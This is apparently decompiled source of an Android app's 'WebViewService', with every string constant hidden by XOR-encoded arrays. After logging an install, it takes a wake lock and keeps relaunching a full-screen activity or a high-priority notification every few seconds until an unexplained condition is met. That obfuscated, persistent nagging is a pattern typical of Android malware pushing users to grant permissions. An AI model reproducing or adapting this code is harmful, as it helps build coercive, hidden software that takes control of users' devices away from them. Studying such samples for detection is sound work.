package com.mistral.jon;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.os.PowerManager;
import com.mistral.jon.activity.HelpActivity;
import com.mistral.jon.activity.WebViewActivity;
import z.ayp;
import z.azb;
import z.bbo;
import z.bcq;
import z.gz.e;

public class WebViewService extends Service {
    private static final String a = "WebViewService";
    private static long[] a;
    private boolean a;

    static {
        long[] arr_v = new long[170];
        WebViewService.a = arr_v;
        arr_v[0] = 52002597L;
        arr_v[1] = 0x45EC0D2EL;
        arr_v[2] = 0x2F7E5465L;
        arr_v[3] = 0x6B77806DL;
        arr_v[4] = -698740333L;
        arr_v[5] = 0x2D0A818L;
        arr_v[6] = 0x7303DBACL;
        arr_v[7] = 1200204359L;
        arr_v[8] = 0x28AB58A0L;
        arr_v[9] = -1094398360L;
        arr_v[10] = 0x4C086267L;
        arr_v[11] = 92925083L;
        arr_v[12] = -1060057374L;
        arr_v[13] = 0x7031BAB0L;
        arr_v[14] = 717940677L;
        arr_v[15] = 0x62775DBCL;
        arr_v[16] = 0xFFFFFFFFEF505AE5L;
        arr_v[17] = 0x566CEB60L;
        arr_v[18] = 0xF7C725CL;
        arr_v[19] = 0x28684315L;
        arr_v[20] = -1033510088L;
        arr_v[21] = 0x43CBE677L;
        arr_v[22] = 1234507594L;
        arr_v[23] = 0x40AF9AE7L;
        arr_v[24] = 0x1B6FF7A8L;
        arr_v[25] = 0x5AD62925L;
        arr_v[26] = 0x2008945FL;
        arr_v[27] = 0x1BA2B70CL;
        arr_v[28] = 0x27DBC34FL;
        arr_v[29] = 0x59A1A53L;
        arr_v[30] = 0x66C82E73L;
        arr_v[0x1F] = 0x2C39ECB6L;
        arr_v[0x20] = 0x11A2BF5AL;
        arr_v[33] = 0x2A301B74L;
        arr_v[34] = 1121080516L;
        arr_v[35] = 0x57357A0AL;
        arr_v[36] = 0x5F023061L;
        arr_v[37] = 0x369509F8L;
        arr_v[38] = 0x116D01D4L;
        arr_v[39] = 0x4B9FE414L;
        arr_v[40] = 1749391205L;
        arr_v[41] = 0x168C4AF7L;
        arr_v[42] = 0x2FAE8EE0L;
        arr_v[43] = 0xF992F03L;
        arr_v[44] = 1591380422L;
        arr_v[45] = 0x3FE888A0L;
        arr_v[46] = 0x25C93E7EL;
        arr_v[0x2F] = 0x6C6A708CL;
        arr_v[0x30] = 0x1678814DL;
        arr_v[49] = 0x331B7C06L;
        arr_v[50] = 0x5048683BL;
        arr_v[51] = 1041720258L;
        arr_v[52] = 1656660091L;
        arr_v[53] = 0x2603049L;
        arr_v[54] = 1697830696L;
        arr_v[55] = 0x2D1BBB4EL;
        arr_v[56] = 0x2A8204F4L;
        arr_v[57] = 0x2750547CL;
        arr_v[58] = 0x2A7474DCL;
        arr_v[59] = -383521700L;
        arr_v[60] = -2031018502L;
        arr_v[61] = 1252805276L;
        arr_v[62] = -782900866L;
        arr_v[0x3F] = 0x76AE8F50L;
        arr_v[0x40] = 355220259L;
        arr_v[65] = 0x5146CBC0L;
        arr_v[66] = 0x100D00A1L;
        arr_v[67] = 0xFFFFFFFFCBA2CE8AL;
        arr_v[68] = -2004728462L;
        arr_v[69] = 0x2400791L;
        arr_v[70] = 0x1B67849FL;
        arr_v[71] = 1304708874L;
        arr_v[72] = 1927200453L;
        arr_v[73] = 1050240093L;
        arr_v[74] = 1028948886L;
        arr_v[75] = 970012977L;
        arr_v[76] = 0x1F15647L;
        arr_v[77] = 0x4BA9F8ADL;
        arr_v[78] = 0x1B29FCB5L;
        arr_v[0x4F] = 0x7FCA45F6L;
        arr_v[80] = 508658897L;
        arr_v[81] = -1974283202L;
        arr_v[82] = 0xFFFFFFFFAE84C161L;
        arr_v[83] = -1284361401L;
        arr_v[84] = 0xFFFFFFFF969F310BL;
        arr_v[85] = -1416090950L;
        arr_v[86] = 2025000896L;
        arr_v[87] = 0xFFFFFFFFEF8011C8L;
        arr_v[88] = 0xFFFFFFFFBF39619FL;
        arr_v[89] = 2053997172L;
        arr_v[90] = 0x384FB26L;
        arr_v[91] = -105337628L;
        arr_v[92] = 0xFFFFFFFFF04E3D40L;
        arr_v[93] = 0xFFFFFFFFFAA979B0L;
        arr_v[94] = -1870500026L;
        arr_v[0x5F] = 0x106631B7L;
        arr_v[0x60] = 0x4030E198L;
        arr_v[97] = 0xFFFFFFFF8BAF543EL;
        arr_v[98] = 0xFFFFFFFFDF940515L;
        arr_v[99] = 0xFFFFFFFF97B55BBAL;
        arr_v[100] = -960188894L;
        arr_v[101] = 0x5DFF7BFBL;
        arr_v[102] = 0x305BFE4AL;
        arr_v[103] = 0x2CC198FEL;
        arr_v[104] = 0xBE17CFBL;
        arr_v[105] = 0x2BBE2760L;
        arr_v[106] = 1040057916L;
        arr_v[107] = 1642707624L;
        arr_v[108] = 1144226104L;
        arr_v[109] = 0x2E2448C6L;
        arr_v[110] = 0x5B4B884BL;
        arr_v[0x6F] = 0x55F7D9D9L;
        arr_v[0x70] = 173960299L;
        arr_v[0x71] = 0x464FD03FL;
        arr_v[0x72] = 0x2090AC07L;
        arr_v[0x73] = 0x2A746E31L;
        arr_v[0x74] = 0x21EC0A73L;
        arr_v[0x75] = -201950920L;
        arr_v[0x76] = 0x1168BF8BL;
        arr_v[0x77] = 0xFFFFFFFFB6CE051FL;
        arr_v[120] = -1033297459L;
        arr_v[0x79] = 0xFFFFFFFF98813AB9L;
        arr_v[0x7A] = -407478661L;
        arr_v[0x7B] = -20330051L;
        arr_v[0x7C] = 627281260L;
        arr_v[0x7D] = 0x552202A4L;
        arr_v[0x7E] = -1385360814L;
        arr_v[0x7F] = 0x1E4BF3FFL;
        arr_v[0x80] = 0xFFFFFFFFBBB584A1L;
        arr_v[0x81] = 0xFFFFFFFFE392E5FAL;
        arr_v[130] = -358109300L;
        arr_v[0x83] = 0xFFFFFFFFA3EE0C19L;
        arr_v[0x84] = 0xFFFFFFFFB9AFCCF2L;
        arr_v[0x85] = 970666209L;
        arr_v[0x86] = 1592464052L;
        arr_v[0x87] = 0x333ADE03L;
        arr_v[0x88] = 0x5189797L;
        arr_v[0x89] = 1050496982L;
        arr_v[0x8A] = 0xFFFFFFFF9EE27A4DL;
        arr_v[0x8B] = 0xFFFFFFFFD88B3C06L;
        arr_v[140] = 0xFFFFFFFFA897512BL;
        arr_v[0x8D] = -1282140365L;
        arr_v[0x8E] = 0xFFFFFFFFB30470A2L;
        arr_v[0x8F] = 1781706084L;
        arr_v[0x90] = 0xFFFFFFFFF6B3B344L;
        arr_v[0x91] = 0xFFFFFFFFBD776ED0L;
        arr_v[0x92] = 0x4CDE529BL;
        arr_v[0x93] = -2021185693L;
        arr_v[0x94] = 0xFFFFFFFF9DAF54DCL;
        arr_v[0x95] = 0xFFFFFFFFBA599597L;
        arr_v[150] = 0xFFFFFFFF8E0A8F99L;
        arr_v[0x97] = 0x2FF46819L;
        arr_v[0x98] = 0xFFFFFFFFA4E58707L;
        arr_v[0x99] = 0x3424C254L;
        arr_v[0x9A] = 0x3D3F0C11L;
        arr_v[0x9B] = 0xFFFFFFFF8BCEA109L;
        arr_v[0x9C] = 0x632DA1EBL;
        arr_v[0x9D] = 0xFFFFFFFFCE115651L;
        arr_v[0x9E] = 0xFFFFFFFFE5EF974DL;
        arr_v[0x9F] = 600700115L;
        arr_v[0xA0] = -480684744L;
        arr_v[0xA1] = 0xFFFFFFFF8B74B779L;
        arr_v[0xA2] = 0x44637764L;
        arr_v[0xA3] = 0x353862D9L;
        arr_v[0xA4] = 2039027271L;
        arr_v[0xA5] = 2073420678L;
        arr_v[0xA6] = 0x1CB7703EL;
        arr_v[0xA7] = 0x7DF961D5L;
        arr_v[0xA8] = 0x7DCEF166L;
        arr_v[0xA9] = 0x5E1CAA51L;
    }

    public WebViewService() {
        this.a = ((int)WebViewService.a[0]) ^ 52002597;
    }

    // Detected as a lambda implementation
    private void a() [...]

    private void b() {
        NotificationManager notificationManager0 = (NotificationManager)this.getSystemService("notification");
        Intent intent0 = WebViewActivity.a(this);
        PendingIntent pendingIntent0 = PendingIntent.getActivity(this, ((int)WebViewService.a[0]) ^ 52002597, intent0, ((int)WebViewService.a[0]) ^ 52002597);
        long[] arr_v = WebViewService.a;
        byte[] arr_b = new byte[((int)arr_v[2]) ^ 0x2F7E5445];
        arr_b[((int)arr_v[0]) ^ 52002597] = ((int)arr_v[0x9B]) ^ 0x74315E8E;
        arr_b[((int)arr_v[1]) ^ 0x45EC0D2F] = ((int)arr_v[0x9C]) ^ 0x632DA1D1;
        arr_b[((int)arr_v[5]) ^ 0x2D0A81A] = ((int)arr_v[0x60]) ^ 0x4030E1E4;
        arr_b[((int)arr_v[7]) ^ 1200204356] = ((int)arr_v[0x9D]) ^ 0x31EEA9DE;
        arr_b[4] = ((int)arr_v[85]) ^ 1416090900;
        arr_b[5] = ((int)arr_v[43]) ^ 0xF992F1B;
        arr_b[((int)arr_v[11]) ^ 92925085] = ((int)arr_v[81]) ^ 0x75AD2BA7;
        arr_b[((int)arr_v[13]) ^ 0x7031BAB7] = ((int)arr_v[0x9E]) ^ 437283005;
        arr_b[((int)arr_v[15]) ^ 1651989940] = ((int)arr_v[0x9F]) ^ 600700071;
        arr_b[((int)arr_v[17]) ^ 0x566CEB69] = ((int)arr_v[0x87]) ^ 859496027;
        arr_b[((int)arr_v[19]) ^ 0x2868431F] = ((int)arr_v[0xA0]) ^ 0x1CA6AAC0;
        arr_b[((int)arr_v[21]) ^ 0x43CBE67C] = ((int)arr_v[0xA1]) ^ 1955285204;
        arr_b[((int)arr_v[23]) ^ 0x40AF9AEB] = ((int)arr_v[33]) ^ 707795730;
        arr_b[((int)arr_v[25]) ^ 1523984680] = ((int)arr_v[5]) ^ 0x2D0A81A;
        arr_b[((int)arr_v[27]) ^ 0x1BA2B702] = ((int)arr_v[65]) ^ 0x5146CB90;
        arr_b[((int)arr_v[29]) ^ 0x59A1A5C] = ((int)arr_v[102]) ^ 0x305BFE6B;
        arr_b[((int)arr_v[0x1F]) ^ 0x2C39ECA6] = ((int)arr_v[34]) ^ 1121080483;
        arr_b[((int)arr_v[0x20]) ^ 0x11A2BF4B] = ((int)arr_v[0x89]) ^ 0x3E9D4F80;
        arr_b[((int)arr_v[28]) ^ 0x27DBC35D] = ((int)arr_v[0xA2]) ^ 0x4463770B;
        arr_b[((int)arr_v[35]) ^ 0x57357A19] = ((int)arr_v[0xA3]) ^ 0x353862B5;
        arr_b[((int)arr_v[6]) ^ 0x7303DBB8] = ((int)arr_v[0xA4]) ^ 2039027313;
        arr_b[((int)arr_v[38]) ^ 0x116D01C1] = ((int)arr_v[0xA5]) ^ 2073420783;
        arr_b[((int)arr_v[22]) ^ 1234507612] = ((int)arr_v[66]) ^ 0x100D0099;
        arr_b[((int)arr_v[41]) ^ 0x168C4AE0] = ((int)arr_v[74]) ^ 1028948954;
        arr_b[((int)arr_v[43]) ^ 0xF992F1B] = ((int)arr_v[0x92]) ^ 1289638604;
        arr_b[((int)arr_v[45]) ^ 1072203961] = ((int)arr_v[0xA2]) ^ 0x4463770B;
        arr_b[((int)arr_v[0x2F]) ^ 0x6C6A7096] = ((int)arr_v[0x4F]) ^ 0x7FCA4587;
        arr_b[((int)arr_v[24]) ^ 0x1B6FF7B3] = ((int)arr_v[0x7C]) ^ 0x25638D0E;
        arr_b[((int)arr_v[49]) ^ 0x331B7C1A] = ((int)arr_v[0x92]) ^ 1289638604;
        arr_b[((int)arr_v[51]) ^ 1041720287] = ((int)arr_v[0x89]) ^ 0x3E9D4F80;
        arr_b[((int)arr_v[53]) ^ 0x2603057] = ((int)arr_v[69]) ^ 0x24007E1;
        arr_b[((int)arr_v[54]) ^ 1697830711] = ((int)arr_v[66]) ^ 0x100D0099;
        e gz$e0 = new e(this, bbo.a(this, 4, "high")).a(((int)WebViewService.a[57]) ^ 0x2658545B).a(this.getString(((int)WebViewService.a[0xA6]) ^ 0x63BA703C));
        long[] arr_v1 = WebViewService.a;
        int v = ((int)arr_v1[0xA7]) ^ 0x2F461E0;
        Object[] arr_object = new Object[((int)arr_v1[1]) ^ 0x45EC0D2F];
        int v1 = ((int)arr_v1[0]) ^ 52002597;
        arr_object[v1] = this.getString(((int)arr_v1[0xA8]) ^ 0x2C3F179);
        e gz$e1 = gz$e0.b(this.getString(v, arr_object)).a(null).a(pendingIntent0, ((boolean)(((int)WebViewService.a[1]) ^ 0x45EC0D2F))).d(4).a(((int)WebViewService.a[0]) ^ 52002597, this.getString(((int)WebViewService.a[0xA9]) ^ 554805876), pendingIntent0);
        notificationManager0.cancel(((int)WebViewService.a[19]) ^ 0x2868431F);
        notificationManager0.notify(((int)WebViewService.a[19]) ^ 0x2868431F, gz$e1.a());
    }

    @Override  // android.app.Service
    public IBinder onBind(Intent intent0) {
        throw new UnsupportedOperationException();
    }

    @Override  // android.app.Service
    public int onStartCommand(Intent intent0, int v, int v1) {
        if(!this.a) {
            this.a = ((int)WebViewService.a[1]) ^ 0x45EC0D2F;
            new Thread(() -> {
                ayp.a().a("Started", "WebViewService");
                bbo.a(this, "Successfully installed", "", 0x1080027);
                PowerManager powerManager0 = (PowerManager)this.getSystemService("power");
                long[] arr_v = WebViewService.a;
                int v = ((int)arr_v[1]) ^ 0x45EC0D2F;
                byte[] arr_b = new byte[((int)arr_v[2]) ^ 0x2F7E5445];
                arr_b[((int)arr_v[0]) ^ 52002597] = ((int)arr_v[58]) ^ 0x2A7474F7;
                arr_b[((int)arr_v[1]) ^ 0x45EC0D2F] = ((int)arr_v[59]) ^ 0x16DC139E;
                arr_b[((int)arr_v[5]) ^ 0x2D0A81A] = ((int)arr_v[21]) ^ 0x43CBE67C;
                arr_b[((int)arr_v[7]) ^ 1200204356] = ((int)arr_v[60]) ^ 2031018536;
                arr_b[4] = ((int)arr_v[61]) ^ 1252805333;
                arr_b[5] = ((int)arr_v[62]) ^ 782900964;
                arr_b[((int)arr_v[11]) ^ 92925085] = ((int)arr_v[0x3F]) ^ 0x76AE8F03;
                arr_b[((int)arr_v[13]) ^ 0x7031BAB7] = ((int)arr_v[0x40]) ^ 355220313;
                arr_b[((int)arr_v[15]) ^ 1651989940] = ((int)arr_v[40]) ^ 0x68459750;
                arr_b[((int)arr_v[17]) ^ 0x566CEB69] = ((int)arr_v[65]) ^ 0x5146CB90;
                arr_b[((int)arr_v[19]) ^ 0x2868431F] = ((int)arr_v[66]) ^ 0x100D0099;
                arr_b[((int)arr_v[21]) ^ 0x43CBE67C] = ((int)arr_v[59]) ^ 0x16DC139E;
                arr_b[((int)arr_v[23]) ^ 0x40AF9AEB] = ((int)arr_v[67]) ^ 0x345D3134;
                arr_b[((int)arr_v[25]) ^ 1523984680] = ((int)arr_v[52]) ^ 0x62BEA011;
                arr_b[((int)arr_v[27]) ^ 0x1BA2B702] = ((int)arr_v[68]) ^ 2004728535;
                arr_b[((int)arr_v[29]) ^ 0x59A1A5C] = ((int)arr_v[69]) ^ 0x24007E1;
                arr_b[((int)arr_v[0x1F]) ^ 0x2C39ECA6] = ((int)arr_v[70]) ^ 459769003;
                arr_b[((int)arr_v[0x20]) ^ 0x11A2BF4B] = ((int)arr_v[71]) ^ 1304708991;
                arr_b[((int)arr_v[28]) ^ 0x27DBC35D] = ((int)arr_v[72]) ^ 1927200508;
                arr_b[((int)arr_v[35]) ^ 0x57357A19] = ((int)arr_v[73]) ^ 1050240057;
                arr_b[((int)arr_v[6]) ^ 0x7303DBB8] = ((int)arr_v[72]) ^ 1927200508;
                arr_b[((int)arr_v[38]) ^ 0x116D01C1] = ((int)arr_v[50]) ^ 0x5048687C;
                arr_b[((int)arr_v[22]) ^ 1234507612] = ((int)arr_v[55]) ^ 0x2D1BBB0C;
                arr_b[((int)arr_v[41]) ^ 0x168C4AE0] = ((int)arr_v[74]) ^ 1028948954;
                arr_b[((int)arr_v[43]) ^ 0xF992F1B] = ((int)arr_v[40]) ^ 0x68459750;
                arr_b[((int)arr_v[45]) ^ 1072203961] = ((int)arr_v[75]) ^ 970013023;
                arr_b[((int)arr_v[0x2F]) ^ 0x6C6A7096] = ((int)arr_v[76]) ^ 0x1F15634;
                arr_b[((int)arr_v[24]) ^ 0x1B6FF7B3] = ((int)arr_v[0x30]) ^ 0x16788107;
                arr_b[((int)arr_v[49]) ^ 0x331B7C1A] = ((int)arr_v[66]) ^ 0x100D0099;
                arr_b[((int)arr_v[51]) ^ 1041720287] = ((int)arr_v[77]) ^ 1269430490;
                arr_b[((int)arr_v[53]) ^ 0x2603057] = ((int)arr_v[78]) ^ 0x1B29FCD4;
                arr_b[((int)arr_v[54]) ^ 1697830711] = ((int)arr_v[0x4F]) ^ 0x7FCA4587;
                powerManager0.newWakeLock(v, "wl:2").acquire();
                int v1 = bcq.a(this).getInt("config:dialog:timeout", 30);
                while(!azb.b(this)) {
                    if(!WebViewActivity.a && !HelpActivity.a) {
                        try {
                            Thread.sleep(v1 * 1000);
                        }
                        catch(InterruptedException interruptedException0) {
                            interruptedException0.printStackTrace();
                        }
                        if(WebViewActivity.a || HelpActivity.a) {
                            continue;
                        }
                        if(azb.b(this)) {
                            break;
                        }
                        if(Build.VERSION.SDK_INT < 29) {
                            ayp.a().a("Show WebViewActivity", "WebViewService");
                            WebViewActivity.a(this);
                        }
                        else {
                            ayp.a().a("Show Notification", "WebViewService");
                            this.b();
                        }
                    }
                    else {
                        try {
                            Thread.sleep(1000L);
                        }
                        catch(InterruptedException interruptedException1) {
                            interruptedException1.printStackTrace();
                        }
                    }
                }
                bbo.a(this);
                this.a = false;
                ayp ayp0 = ayp.a();
                long[] arr_v1 = WebViewService.a;
                byte[] arr_b1 = new byte[((int)arr_v1[2]) ^ 0x2F7E5445];
                arr_b1[((int)arr_v1[0]) ^ 52002597] = ((int)arr_v1[109]) ^ 0x2E2448E0;
                arr_b1[((int)arr_v1[1]) ^ 0x45EC0D2F] = ((int)arr_v1[0x93]) ^ 2021185765;
                arr_b1[((int)arr_v1[5]) ^ 0x2D0A81A] = ((int)arr_v1[80]) ^ 508658913;
                arr_b1[((int)arr_v1[7]) ^ 1200204356] = ((int)arr_v1[0x94]) ^ 0x6250AB48;
                arr_b1[4] = ((int)arr_v1[0x95]) ^ 1168534080;
                arr_b1[5] = ((int)arr_v1[22]) ^ 1234507612;
                arr_b1[((int)arr_v1[11]) ^ 92925085] = ((int)arr_v1[150]) ^ 0x71F5703E;
                arr_b1[((int)arr_v1[13]) ^ 0x7031BAB7] = ((int)arr_v1[0x97]) ^ 0x2FF46846;
                arr_b1[((int)arr_v1[15]) ^ 1651989940] = ((int)arr_v1[0x40]) ^ 355220313;
                arr_b1[((int)arr_v1[17]) ^ 0x566CEB69] = ((int)arr_v1[0x6F]) ^ 0x55F7D9E8;
                arr_b1[((int)arr_v1[19]) ^ 0x2868431F] = ((int)arr_v1[54]) ^ 1697830711;
                arr_b1[((int)arr_v1[21]) ^ 0x43CBE67C] = ((int)arr_v1[0x98]) ^ 1528461530;
                arr_b1[((int)arr_v1[23]) ^ 0x40AF9AEB] = ((int)arr_v1[0x80]) ^ 0x444A7B7F;
                arr_b1[((int)arr_v1[25]) ^ 1523984680] = ((int)arr_v1[1]) ^ 0x45EC0D2F;
                arr_b1[((int)arr_v1[27]) ^ 0x1BA2B702] = ((int)arr_v1[42]) ^ 0x2FAE8ED7;
                arr_b1[((int)arr_v1[29]) ^ 0x59A1A5C] = ((int)arr_v1[66]) ^ 0x100D0099;
                arr_b1[((int)arr_v1[0x1F]) ^ 0x2C39ECA6] = ((int)arr_v1[0x6F]) ^ 0x55F7D9E8;
                arr_b1[((int)arr_v1[0x20]) ^ 0x11A2BF4B] = ((int)arr_v1[78]) ^ 0x1B29FCD4;
                arr_b1[((int)arr_v1[28]) ^ 0x27DBC35D] = ((int)arr_v1[0x99]) ^ 0x3424C217;
                arr_b1[((int)arr_v1[35]) ^ 0x57357A19] = ((int)arr_v1[101]) ^ 0x5DFF7BC8;
                arr_b1[((int)arr_v1[6]) ^ 0x7303DBB8] = ((int)arr_v1[0x89]) ^ 0x3E9D4F80;
                arr_b1[((int)arr_v1[38]) ^ 0x116D01C1] = ((int)arr_v1[101]) ^ 0x5DFF7BC8;
                arr_b1[((int)arr_v1[22]) ^ 1234507612] = ((int)arr_v1[0x86]) ^ 0x5EEB12F5;
                arr_b1[((int)arr_v1[41]) ^ 0x168C4AE0] = ((int)arr_v1[86]) ^ 2025000877;
                arr_b1[((int)arr_v1[43]) ^ 0xF992F1B] = ((int)arr_v1[42]) ^ 0x2FAE8ED7;
                arr_b1[((int)arr_v1[45]) ^ 1072203961] = ((int)arr_v1[44]) ^ 1591380404;
                arr_b1[((int)arr_v1[0x2F]) ^ 0x6C6A7096] = ((int)arr_v1[36]) ^ 0x5F023030;
                arr_b1[((int)arr_v1[24]) ^ 0x1B6FF7B3] = ((int)arr_v1[0x40]) ^ 355220313;
                arr_b1[((int)arr_v1[49]) ^ 0x331B7C1A] = ((int)arr_v1[46]) ^ 0x25C93E27;
                arr_b1[((int)arr_v1[51]) ^ 1041720287] = ((int)arr_v1[8]) ^ 682318019;
                arr_b1[((int)arr_v1[53]) ^ 0x2603057] = ((int)arr_v1[72]) ^ 1927200508;
                arr_b1[((int)arr_v1[54]) ^ 1697830711] = ((int)arr_v1[0x9A]) ^ 1027542100;
                ayp0.a("Exited", "WebViewService");
            }).start();
        }
        return ((int)WebViewService.a[1]) ^ 0x45EC0D2F;
    }
}

